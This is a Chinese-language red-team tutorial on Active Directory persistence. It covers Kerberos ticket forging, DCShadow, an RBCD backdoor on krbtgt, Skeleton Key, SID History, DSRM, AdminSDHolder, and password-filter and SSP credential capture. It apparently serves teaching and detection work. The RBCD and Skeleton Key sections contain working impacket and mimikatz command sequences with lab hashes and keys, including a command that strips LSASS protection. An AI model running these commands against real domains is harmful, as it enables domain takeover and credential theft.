# 域内权限维持专栏

  域权限维持当中攻击者不一定要一直放木马，更多时候是在 AD 的“身份、权限、策略、证书、信任、凭据”这些控制面里埋长期访问点。 

  域维持大致可以分 8 类：

1. **账号型维持**：新建/启用隐藏账号、改密码策略、加组、嵌套组。
2. **组权限型维持**：把低权限账号塞进高权限组，或通过嵌套组间接获得权限。
3. **ACL/ACE 型维持**：给对象加 `GenericAll`、`WriteDACL`、`WriteOwner`、复制目录权限等。
4. **AdminSDHolder/SDProp 型维持**：利用受保护对象权限模板周期性覆盖高权限对象 ACL。
5. **Kerberos 型维持**：Golden Ticket、Silver Ticket、长期票据、异常加密类型。
6. **GPO/SYSVOL 型维持**：篡改组策略、启动脚本、计划任务、登录脚本。
7. **AD CS 证书型维持**：证书模板、可认证证书、Shadow Credentials、Golden Certificate。
8. **信任/混合云型维持**：SIDHistory、域信任、Entra ID/Azure 应用凭据、云角色、邮箱委派。

MITRE ATT&CK 把这些能力分散映射到账号创建、账号操纵、域策略修改、Kerberos 票据伪造、DCSync、认证证书窃取/伪造等技术中。比如创建域账号属于 T1136.002，GPO/信任修改属于 T1484，Golden/Silver Ticket 属于 T1558 子技术，DCSync 属于 T1003.006。以上参考的是ATT&CK https://attack.mitre.org/

## 票据传递专栏

​    票据传递（Pass-the-Ticket, Ptt）是一种利用Kerberos认证机制的身份验证攻击技术，攻击者在获取目标用户的有效Kerberos票据（TGT或TGS）后，无需知晓该用户的明文密码或哈希值，直接将窃取的票据注入到当前会话的内存中，从而冒充该用户身份向域内服务发起认证请求并获得相应访问权限；与Pass-the-Hash依赖NTLM协议不同，PtT完全工作在Kerberos体系内，其本质是利用了Kerberos"票据即身份凭证"的设计特性——KDC和服务端在验证时仅校验票据的加密完整性与时效性，而不验证票据持有者是否为原始申请者，因此攻击者一旦获取高权限票据（如域管TGT或黄金票据），即可在票据有效期内（通常10小时，可续期）持续维持域内权限，且由于Kerberos票据不经过LSA的NTLM凭据缓存，传统基于哈希的检测手段往往难以发现此类攻击。

  前文理论太长，我们常说的黄金票据和白银票据都属于票据传递攻击。下文介绍黄金票据和白银票据。

### 黄金票据攻击

  黄金票据（Golden Ticket）是域渗透中一种非常经典的 Kerberos 权限维持技术，它的核心是攻击者一旦获取到域内 `krbtgt` 账户的 NTLM Hash 或 AES 密钥，就可以伪造任意用户的 TGT 票据，从而冒充域管理员等高权限身份访问域内资源。由于 TGT 是 Kerberos 认证体系中的“入场券”，伪造成功后，攻击者不需要知道目标用户密码，也不一定需要真实账号处于可用状态，就可能长期维持域控级访问权限。黄金票据的危害非常高，通常意味着域已经被完全攻陷；防御上需要重点保护 `krbtgt` 密钥、监控异常 Kerberos 票据生命周期和加密类型，并在确认泄露后进行 **krbtgt 双次重置** 来彻底失效旧票据。

#### 创建黄金票据的条件

这里面下面5到8点是常见创建黄金票据之后常见利用失败的一些坑。必需条件为1到4。

| 条件                                     | 说明                                                         |
| ---------------------------------------- | ------------------------------------------------------------ |
| **1. 获取 `krbtgt` 账户 Hash / AES Key** | 这是最核心条件。没有 `krbtgt` 的 NTLM Hash、AES128 Key 或 AES256 Key，就无法签发能被域控认可的伪造 TGT。 |
| **2. 知道域名**                          | 例如 案例中的`redteam.lab`，用于构造 Kerberos Realm。        |
| **3. 知道域 SID**                        | 例如 `S-1-5-21-...`，黄金票据里需要写入用户 SID、组 SID 等信息。 |
| **4. 指定伪造用户信息**                  | 一般来说是高权限用户。可以是已有用户，也可以伪造一个用户名；关键是构造出对应的 RID/SID 和组成员信息。 |
| **5. 指定高权限组 SID/RID**              | 常见是 Domain Admins、Enterprise Admins、Administrators 等组，用来让票据携带高权限 PAC。 |
| **6. 域控仍信任当前 `krbtgt` 密钥**      | 如果蓝队已经对 `krbtgt` 做了两次轮换，旧密钥签发的黄金票据会失效。 |
| **7. 时间不能严重偏差**                  | Kerberos 对时间敏感，客户端与域控时间偏差过大时票据可能无法使用。 |
| **8. 目标服务接受 Kerberos 认证**        | 黄金票据本质是伪造 TGT，后续访问 SMB、LDAP、CIFS、HTTP 等服务时，需要能走 Kerberos 认证流程。 |

### 白银票据攻击

  白银票据（Silver Ticket）是 Kerberos 认证体系中的一种服务票据伪造技术，它的核心不是伪造整个域都信任的 TGT，而是攻击者在获取到**某个服务账号或机器账号的密钥/Hash** 后，直接伪造访问该服务的 TGS 票据，比如 `CIFS`、`HTTP`、`MSSQLSvc`、`LDAP` 等。相比黄金票据，白银票据影响范围更窄，通常只针对某台主机或某个具体服务，但隐蔽性也很强，因为它可以绕过正常向 KDC 申请 TGS 的过程，导致域控侧可能看不到完整的 Kerberos 请求链。简单理解就是：**黄金票据伪造的是“域内通行证”，白银票据伪造的是“某个服务的门票”。**

#### 创建白银票据的条件

你不需要 `krbtgt` 密钥，但必须掌握目标服务对应账号的密钥材料，才能伪造该服务可接受的 TGS 服务票据。

| 条件                                               | 说明                                                         |
| -------------------------------------------------- | ------------------------------------------------------------ |
| **1. 获取目标服务账号/机器账号的 Hash 或 AES Key** | 这是最核心条件。比如要伪造访问某台主机 `CIFS` 服务的票据，就需要该主机机器账号的密钥；要伪造 MSSQL 服务票据，就需要对应 SQL 服务账号的密钥。 |
| **2. 知道目标域名**                                | 例如 `redteam.lab`，用于构造 Kerberos Realm。                |
| **3. 知道域 SID**                                  | 用于构造票据里的用户 SID、组 SID、PAC 信息。                 |
| **4. 知道目标服务 SPN**                            | 白银票据是针对具体服务的，所以必须明确服务类型和目标主机，例如 `cifs/server.redteam.lab`、`http/web.redteam.lab`、`mssqlsvc/db.redteam.lab`。 |
| **5. 指定伪造用户身份和组权限**                    | 可以构造某个用户身份，并在票据 PAC 中携带高权限组信息，例如 Domain Admins、Administrators 等。 |
| **6. 目标服务使用 Kerberos 并接受该服务票据**      | 白银票据不是万能票据，只能用于对应 SPN 的服务。              |
| **7. 目标服务没有强制向 KDC 校验 PAC**             | 很多服务默认不会实时向域控验证 PAC 签名，这也是白银票据能够成立的关键原因之一。 |
| **8. 时间不能严重偏差**                            | Kerberos 对时间敏感，票据时间异常可能导致认证失败或触发告警。 |

### 钻石票据攻击

  钻石票据（Diamond Ticket）是一种比传统黄金票据更隐蔽的 Kerberos 票据伪造技术，它不是完全离线伪造一张 TGT，而是先使用合法域用户向 KDC 正常申请一张真实 TGT，然后在掌握 `krbtgt` 密钥的前提下，对该票据中的 PAC 权限信息进行修改并重新签名。由于钻石票据保留了真实 KDC 签发票据的大量正常字段，并且日志中会存在正常的 AS-REQ/AS-REP 请求链路，因此相比黄金票据更容易绕过“无 4768 对应 4769”这类检测规则。简单理解，黄金票据是‘凭空造票’，而钻石票据是‘拿真票改权限’。

### 蓝宝石票据攻击

  蓝宝石票据（Sapphire Ticket）是一种比钻石票据更隐蔽的 Kerberos 票据伪造技术，它不是简单修改合法 TGT 中的 PAC，而是通过特定方式获取高权限用户的真实 PAC，并将其替换到攻击者合法申请的 TGT 中，再利用 `krbtgt` 密钥重新签名，从而让票据在日志链路和 PAC 内容上都更接近真实高权限用户行为。

### 票据攻击总结

| 票据类型            | 中文名     | 核心原理                                                    | 关键材料                                        | 伪造对象                    | 隐蔽性理解                                               |
| ------------------- | ---------- | ----------------------------------------------------------- | ----------------------------------------------- | --------------------------- | -------------------------------------------------------- |
| **Golden Ticket**   | 黄金票据   | 使用 `krbtgt` 密钥离线伪造 TGT                              | `krbtgt` NTLM/AES、域 SID                       | **TGT**                     | 没有真实 AS-REQ 链路，容易被 4768/4769 关联检测发现异常  |
| **Silver Ticket**   | 白银票据   | 使用服务账号/机器账号密钥离线伪造某服务 TGS                 | 服务账号或机器账号 NTLM/AES、SPN                | **TGS**                     | 不一定经过 KDC 请求 TGS，DC 侧日志少，但只能访问指定服务 |
| **Diamond Ticket**  | 钻石票据   | 先申请真实 TGT，再修改 PAC，最后用 `krbtgt` 重签名          | 合法域账号凭据、`krbtgt` 密钥                   | **真实 TGT 改造后**         | 有真实 AS-REQ 链路，比 Golden 更像正常票据               |
| **Sapphire Ticket** | 蓝宝石票据 | 先申请真实 TGT，再获取高权限用户真实 PAC 并替换，最后重签名 | 合法域账号凭据、`krbtgt` 密钥、目标用户真实 PAC | **真实 TGT + 高权真实 PAC** | PAC 更真实，比 Diamond 更难从 PAC 内容上发现异常         |

  流程如下：

```
Kerberos 票据攻击
│
├── 一、离线伪造票据
│   │
│   ├── Golden Ticket / 黄金票据
│   │   ├── 伪造对象：TGT
│   │   ├── 核心密钥：krbtgt 密钥
│   │   └── 理解：凭空造一张“域内通行证”
│   │
│   └── Silver Ticket / 白银票据
│       ├── 伪造对象：TGS
│       ├── 核心密钥：服务账号/机器账号密钥
│       └── 理解：凭空造一张“某服务门票”
│
└── 二、真实票据改造
    │
    ├── Diamond Ticket / 钻石票据
    │   ├── 基础票据：真实 TGT
    │   ├── PAC 处理：修改 PAC
    │   └── 理解：拿真票改权限
    │
    └── Sapphire Ticket / 蓝宝石票据
        ├── 基础票据：真实 TGT
        ├── PAC 处理：替换为高权用户真实 PAC
        └── 理解：拿真票换真高权 PAC
```



## DCshadow攻击

   DCShadow 并非传统意义上的"漏洞"，而是**对 Active Directory 目录复制协议（DRS）的协议级滥用**。它利用的是 AD 架构设计中的**信任假设缺陷**——域控之间默认相互信任，KDC 不对复制来源进行严格验证。

```
┌─────────────────────────────────────────────────────────────┐
│              Active Directory 复制架构信任模型                  │
│                                                             │
│   ┌─────────┐      DRS 复制 (RPC)      ┌─────────┐        │
│   │  DC01   │ ←──────────────────────→ │  DC02   │        │
│   │ (KDC)   │   相互信任，无额外验证    │ (KDC)   │        │
│   └─────────┘                          └─────────┘        │
│        ↑                                                    │
│   ┌─────────┐                                               │
│   │ 伪造 DC  │  ── 注册 serverReferenceBL ──→ 配置 NC       │
│   │ (攻击者) │  ── 触发 DRSReplicaAdd ──→  DC01 接受复制   │
│   └─────────┘                                               │
│                                                             │
│  核心缺陷：DC01 仅验证复制伙伴是否为"已注册 DC"，            │
│           不验证其是否为物理存在的合法域控                    │
└─────────────────────────────────────────────────────────────┘
```



关键协议调用接口如下：

| RPC 接口              | 功能          | 滥用点                       |
| :-------------------- | :------------ | :--------------------------- |
| `IDL_DRSBind`         | 建立 DRS 会话 | 伪造 DC 身份绑定             |
| `IDL_DRSAddEntry`     | 添加复制伙伴  | 注册伪造 DC 到配置 NC        |
| `IDL_DRSReplicaAdd`   | 请求复制      | 触发伪造 DC → 真实 DC 的复制 |
| `IDL_DRSGetNCChanges` | 获取变更      | 正常 DCSync 使用             |
| `IDL_DRSUpdateRefs`   | 更新引用      | 维持伪造 DC 的合法表象       |

## 权限维持之RBCD

  相关委派的概念和实验已经做过了。下面拿rbcd来做权限维持。如果这里我们假设被委派的服务 B 为 krbtgt，而服务 A 为我们控制的一个服务账号或机器账号。配置服务 A 到服务 B 的约束性委派或者基于资源的约束性委派，那么我们控制的账户就可以获取 KDC（Key Distribution Centre）服务的 ST 服务票据了(也就是 TGT 认购权证)。拿到了 KDC 的 ST 服务票据后，我们就可以伪造任何权限用户的 TGT 认购权证，以此来打造一个**变种的黄金票据**了

### RBCD to KRBTGT完整复现

条件依旧如下

```

域控主机名：dc.redteam.lab

```
 //制作金票，得到票据
 impacket-ticketer \
    -nthash 73037d2601f8bb3282687f38f0850df7 \
    -domain-sid S-1-5-21-1017632322-3498184940-2344110865 \

//导入票据
  export KRB5CCNAME=/tmp/administrator.ccache

impacket-secretsdump -k -no-pass \
    -dc-ip 10.10.10.143 'redteam.lab/administrator@dc.redteam.lab' \
    -just-dc-user 'TEST$'
```

  给机器账户TEST$添加"协议转换"标志,因为：机器账户默认没有 TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION（允许协议转换），S4U2Self 拿不到可转发票据，S4U2Proxy 会失败。

```
# 用域管 hash 远程登录域控，执行 PowerShell 修改 TEST$ 的 userAccountControl
  # 在原值 528384 上叠加 16777216，使其支持协议转换
  impacket-wmiexec \
    -hashes :42e2656ec24331269f82160ff5962387 \
    'redteam.lab/administrator@dc.redteam.lab' \
    "powershell -c \"\$comp = [ADSI]'LDAP://CN=TEST,CN=Computers,DC=redteam,DC=lab'; \$comp.userAccountControl = 17305600; \$comp.SetInfo(); Write-Host 'Done'\""
```

```
 # 在 krbtgt 账户的 msDS-AllowedToActOnBehalfOfOtherIdentity 属性中写入 TEST$ 的 SID
  # -delegate-from: 受控账户（后门触发者）
  # -delegate-to: 目标账户（被委派对象）
  # -action write: 写入委派关系
  impacket-rbcd \
    -hashes :42e2656ec24331269f82160ff5962387 \
    -delegate-from 'TEST$' -delegate-to 'krbtgt' -action write \
    -dc-ip 10.10.10.143 'redteam.lab/administrator'

  impacket-rbcd
    -hashes :42e2656ec24331269f82160ff5962387 \
    -delegate-to 'krbtgt' -action read \
    -dc-ip 10.10.10.143 'redteam.lab/administrator'

```

触发后门（S4U2Self + S4U2Proxy）

```
  # 获取 TEST$ 的 TGT（使用 AES256 密钥，比 RC4 更稳定）
  # 生成 TEST$.ccache
  impacket-getTGT \
    -aesKey 684612a6ffe38182b523d9e20d6feed0236c613e5d4dad9cd217b62921a725d5 \
    -dc-ip 10.10.10.143 'redteam.lab/TEST$'

  # 加载 TEST$ 的 TGT，作为 S4U2Self 的基底票据
  export KRB5CCNAME=/tmp/TEST$.ccache

  # S4U2Self + S4U2Proxy：模拟 administrator，请求 krbtgt 的服务票据
  # 因为目标是 krbtgt，返回的票据本质上就是 administrator 的 TGT（变种金票）
  #  关键：-spn 后面只写 krbtgt，不要加 /redteam.lab
 impacket-getST.py \
    -spn krbtgt -impersonate administrator -k -no-pass \
    -dc-ip 10.10.10.143 'redteam.lab/TEST$'
  
  这里成功的话输出： administrator@krbtgt_REDTEAM.LAB@REDTEAM.LAB.ccache
```

### 总结  

这种手法的优势在于：

    1. 绕过 krbtgt hash 依赖 —— 哪怕你跑完一圈后渗透都没 dump 到 krbtgt hash，只要前期在 krbtgt 上埋了 RBCD 后门，后期随时能「复活」域管权限。
    2. 隐蔽性高 —— 相比金票直接伪造，走正常 S4U2Self/S4U2Proxy 流程，日志里看起来像正常的委派行为。
    3. 对抗旋转密码 —— 如果用的是密码永不过期的服务账户，即使域管密码改了，这个后门依然有效。

可以看看对比图

| 对比项                     | 传统黄金票据 Golden Ticket                             | 委派型变种黄金票据                                           |
| -------------------------- | ------------------------------------------------------ | ------------------------------------------------------------ |
| **核心原理**               | 使用 `krbtgt` 密钥离线伪造 TGT                         | 滥用 Kerberos 委派机制，通过 S4U2Self / S4U2Proxy 代表目标用户申请服务票据 |
| **伪造/获取的票据类型**    | 主要是 **TGT**                                         | 主要是 **TGS / ST 服务票据**                                 |
| **是否需要 `krbtgt` 密钥** | **需要**，这是核心条件                                 | **通常不需要**，重点是服务账号/机器账号的权限和密钥          |
| **依赖的核心材料**         | `krbtgt` NTLM Hash 或 AES Key、域 SID、目标用户/组信息 | 具备委派权限的服务账号/机器账号凭据、目标 SPN、委派配置      |
| **票据来源**               | 攻击者离线构造，KDC 没有真实签发该 TGT                 | 由 KDC 根据 S4U 流程真实签发服务票据                         |
| **攻击范围**               | 影响整个域，理论上可伪造任意用户 TGT                   | 通常受限于委派配置，只能访问被允许委派的服务或目标机器       |
| **典型场景**               | 域控沦陷、DCSync 拿到 `krbtgt` 后进行长期维持          | 约束委派、资源约束委派 RBCD、机器账号委派滥用                |
| **隐蔽性特点**             | 可能出现“有 TGS 请求但无正常 TGT 请求”的异常链路       | 因为票据由 KDC 正常签发，日志链路更像正常 Kerberos 行为      |
| **权限表现**               | 可以伪造 Domain Admins、Enterprise Admins 等高权限 PAC | 可以“代表”高权限用户访问指定服务，例如 CIFS、LDAP、HTTP      |
| **主要限制**               | 一旦 `krbtgt` 双次重置，旧黄金票据失效                 | 受限于委派关系、SPN、账号权限和目标服务                      |
| **防御重点**               | 保护 `krbtgt`、监控 DCSync、双次重置 `krbtgt`          | 审计委派配置、清理非必要 KCD/RBCD、保护机器账号和服务账号    |
| **一句话理解**             | **拿域的根密钥，自己造域内通行证**                     | **借委派机制，合法申请指定服务门票**                         |



## Skeleton Key 万能密码

  Skeleton Key（万能密码）是一种针对 Active Directory 域控认证流程的权限维持技术，它的核心不是修改某个用户的真实密码，也不是重置 Hash，而是在域控的 LSASS 进程中注入/修改认证逻辑，让域内任意用户在保留原密码可用的同时，还额外接受攻击者设置的“万能密码”登录。简单理解就是：用户原来的密码还能正常用，但攻击者可以用同一个固定密码登录多个域账号。

  Skeleton Key 的本质是内存级攻击，需要在域控的 LSASS 进程中打补丁（hook msv1_0!MsvpPasswordValidate），让 KDC 对任意密码都返回验证通过。mimikatz能实现这个攻击。impacket无法深入内核所以不行。

**Skeleton Key 的目标是域控 LSASS，因为域控才负责验证域用户密码。**在一台域控注入后，是不是所有账号都能用 `万能密码` 登录。（mimikatz打Skeleton Key  默认密码就是为mimikatz）。大多数“正常启用、允许登录、认证请求打到这台 DC 的域账号”理论上可以用万能密码通过认证。但是往往重启会失效。

```
注入 LSASS
    ↓
认证逻辑被临时修改
    ↓
域控重启 / LSASS 重启
    ↓
内存补丁消失
```

### LSA上的保护策略

  微软在 2014 年 3 月 12 日添加了 LSA 保护策略，此功能基于 PPL 技术，它是一种纵深防御的安全功能，旨在“防止非管理员非 PPL 进程通过打开进程之类的函数串改 PPL 进程的代码和数据”，以此来防止对 lsass.exe 进程的代码注入。想要启用 LSA 保护，只需要将如下注册表添加 RunAsPPL 的参数并赋值为 1，然后**重启服务器**，**LSASS 才会以 PPL 受保护进程模式启动。**

  在域控上执行  

```
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL /t REG_DWORD /d 1 /f
```

  重启之前，我们在执行就报错了。

![image-20260530225057471](/img/域内权限维持专栏/image-20260530225057471.png)

### LSA策略绕过

  使用 mimikatz 执行如下命令导入 mimidrv.sys 驱动文件后即可绕过 LSA 的保护策略。

```
mimikatz.exe "privilege::debug" "!+" "!processprotect /process:lsass.exe /remove" "misc::skeleton" exit
```

![image-20260530230554939](/img/域内权限维持专栏/image-20260530230554939.png)

  究其原因是因为RunAsPPL/LSA Protection 可以防止普通用户态进程直接读取或注入 LSASS，但不能单独抵抗已获得内核执行能力的攻击者。Mimikatz 通过加载 `mimidrv.sys` 进入内核层，再移除 LSASS 的 PPL 保护并执行 Skeleton Key 注入。因此防御不能只停留在 RunAsPPL，还要结合 Secure Boot、UEFI Lock、HVCI、Vulnerable Driver Blocklist、WDAC/App Control，以及域控上的驱动加载和 LSASS 异常访问监控。



## 域权限维持之 SID History 滥用

​    **SID History 滥用**是域权限维持里一个很隐蔽的点。它的核心不是直接把用户加入 `Domain Admins`，而是把高权限组或高权限账号的 SID 写入某个普通用户的 `sIDHistory` 属性里。这样该用户登录后生成访问令牌时，系统除了包含它自己的 SID，还会把 `sIDHistory` 里的 SID 一起放进 Token，导致它在访问资源时可能被当成“曾经属于某个高权限身份”的用户来授权。

### SID History 的介绍和滥用

`SIDHistory` 原本是微软为**域迁移**设计的属性。比如企业从旧域迁移到新域：

```
旧域用户：OLD\zhangsan
新域用户：NEW\zhangsan
```

  为了让新域用户还能访问旧域里原来授权给旧 SID 的文件、共享、数据库等资源，AD 会把旧账号的 SID 写进新账号的 `sIDHistory` 属性中。这样新用户登录后，Token 里会同时包含：

```
当前用户 SID
当前用户所属组 SID
历史 SID，也就是 sIDHistory
```

所以访问资源时，系统会说：虽然你现在是新域账号，但你带着旧 SID，我仍然可以识别你原来有权限。

  那为什么会导致滥用呢？因为 Windows 做访问控制时，判断的不是“你名字叫什么”，而是看你的访问令牌里有没有匹配的 SID。如果攻击者能给普通用户 `test` 写入一个高权限 SID，例如Domain Admins 的 SID。那么 `test` 登录后，Token 里可能会带上这个高权限 SID。结果就是：

```
moon 表面上不是 Domain Admins 成员
        ↓
但是 Token 里带着 Domain Admins SID
        ↓
访问某些资源时被当成高权限身份
```

| 对比项         | 普通加组                      | SID History 滥用                         |
| -------------- | ----------------------------- | ---------------------------------------- |
| **修改位置**   | 修改高权限组的 `member` 属性  | 修改用户的 `sIDHistory` 属性             |
| **表面现象**   | 用户出现在高权限组成员列表里  | 用户不一定出现在高权限组里               |
| **隐蔽性**     | 较低，容易被组成员审计发现    | 较高，简单查组可能漏掉                   |
| **权限来源**   | 当前组成员关系                | Token 中携带的历史 SID                   |
| **常见检测点** | 4728、4732、4756 等组成员变化 | 4765、4766、5136、用户 `sIDHistory` 异常 |
| **用途**       | 正常授权或直接提权            | 域迁移兼容，也可能被用于权限维持         |

## 重置 DSRM 密码

  **DSRM 密码重置维持**是域权限维持里一个比较“老但实用”的点。它利用的是域控自带的 **Directory Services Restore Mode，目录服务还原模式** 的本地管理员密码。攻击者如果已经拿到域控高权限，可以把某台 DC 的 DSRM 密码改成自己知道的值，后续即使域账号密码被改、域管权限被清理，也可能通过这台 DC 的本地 DSRM 管理员身份重新进入域控。

### DSRM的介绍

   DSRM 全称是：Directory Services Restore Mode(目录服务还原模式).它是域控专用的恢复模式，主要用于：

| 用途               | 说明                                                  |
| ------------------ | ----------------------------------------------------- |
| 修复 AD 数据库     | 比如 `ntds.dit` 损坏时进入恢复模式                    |
| 还原系统状态备份   | 做权威还原或非权威还原                                |
| 离线维护域控       | 在 AD DS 没有正常运行时维护域控                       |
| 使用本地管理员认证 | DSRM 使用的是域控本地的恢复管理员密码，不是域用户密码 |

  安装域控时，会要求设置一个 **DSRM 密码**。这个密码属于每台 DC 自己的本地恢复密码，**不会像普通域账号密码一样在域内复制**，如果域里有多台DC，DC的DSRM的密码也是相互独立的。

  正常情况下，DSRM 账号主要在恢复模式下使用。但如果攻击者控制了域控，就可以做两件事：

1. 重置某台 DC 的 DSRM 密码
2. 修改 DSRM 登录行为，让它在正常模式下也能用于登录

这样一来，攻击者后续可以尝试使用域控本地 Administrator 身份登录这台 DC，这里值得注意的是：而是域控本地的 DSRM Administrator。

| 对比项           | 域 Administrator     | DSRM Administrator              |
| ---------------- | -------------------- | ------------------------------- |
| 账号类型         | 域账号               | 域控本地恢复账号                |
| 存储位置         | AD 数据库            | 本机本地安全数据库/恢复机制相关 |
| 是否域内复制     | 是                   | 否，每台 DC 独立                |
| 默认用途         | 域管理               | 目录服务恢复                    |
| 是否常规登录使用 | 是                   | 默认主要用于 DSRM               |
| 被滥用后的价值   | 域级权限             | 单台 DC 本地管理员权限          |
| 隐蔽性           | 容易被域账号审计覆盖 | 容易被忽略                      |

## AdminSDHolder 滥用

  adminSDHolder 是 AD 中用于保护高权限对象 ACL 的模板对象，SDProp 会周期性将它的安全描述符同步到 Domain Admins、Enterprise Admins、Administrators 等受保护对象上。攻击者如果修改 AdminSDHolder 的 ACL，给自己控制的账号添加 GenericAll、WriteDACL、WriteOwner 等权限，就可以让这些权限被自动同步到高权限对象上，实现隐蔽权限维持。防御时不能只查高权组成员，还要审计 AdminSDHolder ACL、受保护对象 ACL、adminCount=1 对象，并监控 5136、4662、4670 等目录权限变更事件。

### Protected Groups的介绍

**保护组（Protected Groups）**是 Active Directory 中一类被系统重点保护的高权限组，例如 `Domain Admins`、`Enterprise Admins`、`Schema Admins`、`Administrators`、`Account Operators`、`Server Operators`、`Backup Operators` 等。加入这些组的用户或组会被 AD 认为是“受保护对象”，其 ACL 不再普通继承 OU 权限，而是由 `AdminSDHolder` 对象作为权限模板，并通过 `SDProp` 机制周期性同步安全描述符。这样做的目的是防止高权限账号被普通 OU 权限误修改，但攻击者也可以反过来滥用这一机制：只要修改 `AdminSDHolder` 的 ACL，就可能让恶意权限自动同步到这些保护组及其成员上，实现隐蔽的域权限维持。

### AdminSDHolder的介绍

   AdminSDHolder 对象具有唯一的访问控制列表 ACL，用于控制 Protected Groups 受保护组的安全主体的权限，以避免这些特权对象被恶意修改或滥用。可以理解为 AdminSDHolder 的 ACL 配置是一个安全的配置模板。AdminSDHolder对象默认情况下禁用继承，这确保不继承父级权限。默认情况下，只有Administrators、Domain Admins 和 Enterprise Admins 组拥有对AdminSDHolder 对象属性修改权限。

   AdminSDHolder 是 AD 里专门保护高权限对象的“权限模板”。AD 中一些敏感组或敏感用户比如：

```
Domain Admins
Enterprise Admins
Schema Admins
Administrators
Account Operators
Server Operators
Backup Operators
Print Operators
```

  这些对象会被认为是“受保护对象”。系统会定期检查它们的安全描述符，并把 AdminSDHolder 上的 ACL 同步过去，防止它们的权限被普通 OU 继承规则错误影响。

![image-20260531112436075](/img/域内权限维持专栏/image-20260531112436075.png)

### SDProp的介绍

  SDProp 全称为 **Security Descriptor Propagator**，也就是安全描述符传播机制。默认情况下，每隔一小时在持有 PDC 模拟器操作主角色的域控制器上运行一个SDProp（Security Descriptor Propagation）后台进程。SDProp 进程并不知道哪些对象是在 Protected Groups 受保护组里面，**它只能根据目标对象的AdminCount 属性是否为 1 来判断目标对象是否是受保护的。**然后将这些对象的ACL 与 AdminSDHolder 对象上的 ACL 进行比较。如果受保护对象的 ACL 配置与AdminSDHolder 容器的 ACL 配置不一致，SDProp 进程将重写该受保护对象的ACL，使其恢复与 AdminSDHolder 容器相同的 ACL 配置。

```
定期检查受保护对象
        ↓
把 AdminSDHolder 的 ACL 应用到这些对象上
        ↓
确保高权限对象 ACL 保持受保护状态
```

  这个同步周期大约是 **60 分钟**。所以攻击者如果改了 AdminSDHolder 的 ACL，不一定马上看到效果，但过一段时间后，恶意权限可能会自动同步到受保护用户或组上。

  滥用的话，攻击者如果已经有足够权限修改 AdminSDHolder 对象，就可以在它的 ACL 里添加一个自己控制的账号，比如 `test账号`，并赋予高危权限，如下：

| 权限                | 风险                       |
| ------------------- | -------------------------- |
| `GenericAll`        | 完全控制目标对象           |
| `GenericWrite`      | 可写目标对象关键属性       |
| `WriteDACL`         | 可修改目标对象 ACL         |
| `WriteOwner`        | 可修改对象所有者           |
| `AllExtendedRights` | 可能包含重置密码等扩展权限 |
| `ResetPassword`     | 可重置目标账号密码         |

然后 SDProp 会把这个权限同步到受保护对象上

```
攻击者修改 AdminSDHolder ACL
        ↓
给 test 添加 GenericAll / WriteDACL 等权限
        ↓
等待 SDProp 周期同步
        ↓
Domain Admins / Administrator 等受保护对象继承恶意 ACL
        ↓
test 表面不是域管
        ↓
但 test 可以控制域管对象或高权组
```

## 密码搜集之 Hook PasswordChangeNotify

  **Hook PasswordChangeNotify** 是一种典型的后渗透密码收集/权限维持思路，它滥用的是 Windows 的 **LSA Password Filter 密码过滤器机制**。正常情况下，Windows 允许管理员加载自定义密码过滤 DLL，用来在用户改密码时检查密码复杂度、同步密码、审计密码策略等；而攻击者可以把恶意 DLL 注册成密码过滤器，这样当域用户或本地用户修改密码时，LSASS 会调用 DLL 中的 `PasswordChangeNotify` 回调函数，攻击者就能在密码变更的瞬间捕获到用户提交的新明文密码。

Windows 的密码过滤器 DLL 通常要导出几个固定函数

| 函数                     | 作用                                                   |
| ------------------------ | ------------------------------------------------------ |
| `InitializeChangeNotify` | 密码过滤器初始化时调用                                 |
| `PasswordFilter`         | 判断新密码是否符合策略，可允许或拒绝密码变更           |
| `PasswordChangeNotify`   | 密码变更成功后通知 DLL，里面会收到用户名和新密码等信息 |

攻击流程可以参考：

```
攻击者获得高权限
        ↓
准备恶意密码过滤 DLL
        ↓
把 DLL 放到系统可加载位置
        ↓
修改 LSA 的 Notification Packages 配置
        ↓
系统重启或 LSASS 重新加载配置
        ↓
用户后续修改密码
        ↓
LSASS 调用恶意 DLL 的 PasswordChangeNotify
        ↓
攻击者捕获新密码明文
```

### 复现的坑点和攻击链路

  首先就是环境不兼容了，这里找ai改一改做下适配。第二的话，我域控之前的环境上在复现Skeleton Key的时候开启了LSA的保护策略，开启的 RunAsPPL（LSA Protection）。启用后，内核阻止任何非受保护进程打开 lsass，返回 Access Denied。这就是为什么NtOpenProcess 也绕不过的原因——这是内核层硬性保护。

```
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL /t REG_DWORD /d 1 /f
```

  这个是直接影响到了这个实验，所以需要关掉，命令关掉如下，然后需要在重启就行了

```
 reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL /t REG_DWORD /d 0 /f
```

## 密码搜集之注入 SSP

  **注入 SSP（Security Support Provider）** 是后渗透密码收集里一种非常经典的思路，它的核心是：**把恶意的认证模块加载进 LSASS 认证链路中，让系统在用户登录、认证、网络访问等过程中把明文凭据或认证材料传递给攻击者控制的 SSP 模块**。简单理解就是：**PasswordChangeNotify 是等用户改密码时抓新密码；SSP 注入是等用户登录/认证时抓凭据。**

###  SSP 是什么

  SSP 全称是Security Support Provider。在系统层面，SSP 就是一个 dll，用来实现身份验证等安全功能。我们也可以编写自己的 SSP，然后注册到操作系统中，让操作系统支持更多自定义的身份验证方法。如果攻击者获得了机器的最高权限，就可以编写一个恶意的 SSP，然后将其注册到操作系统中。这样当用户登录时，我们的恶意 SSP 就可以捕捉到用户输入的明文密码了，也不会影响用户的正常登录。由于注入 SSP 需要服务器的最高权限。因此在域内的话，通常需要先获得域管理员权限才能在域控制器上执行 SSP 注入。因此，该方法常被用作后权限维持进行内网密码搜集。

## ACL滥用专栏

  ACL 滥用就是攻击者不直接拿高权限身份，而是在 AD 关键对象上留下恶意权限，使普通账号具备“控制高权限对象、修改组成员、重置密码、写入委派、修改 GPO、DCSync”等能力，从而实现隐蔽权限维持。在此之前我们需要学习ACL等相关前置知识进行学习。

### 前置知识

#### Security Principals ( 安全主体)

